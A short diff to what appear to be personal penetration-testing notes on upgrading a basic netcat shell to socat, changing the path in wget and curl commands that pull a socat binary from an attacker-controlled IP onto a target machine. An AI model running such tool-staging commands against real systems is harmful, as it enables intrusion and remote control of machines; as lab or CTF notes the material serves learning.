@@ -3,7 +3,7 @@ get binary https://github.com/andrew-d/static-binaries/blob/master/binaries/linu
 
 from simpler nc shell:
 - upload socat binary to target machine (`python3 -m http.server 8000`)
-- `wget 10.18.21.236/socat` or `curl -O http://10.18.21.236/socat` to dl to current dir
+- `wget 10.18.21.236/tools/socat` or `curl -O http://10.18.21.236/tools/socat` to dl to current dir
 
 socat is used to connect two points together - for example your keyboard/screen and a remote ip+port
 
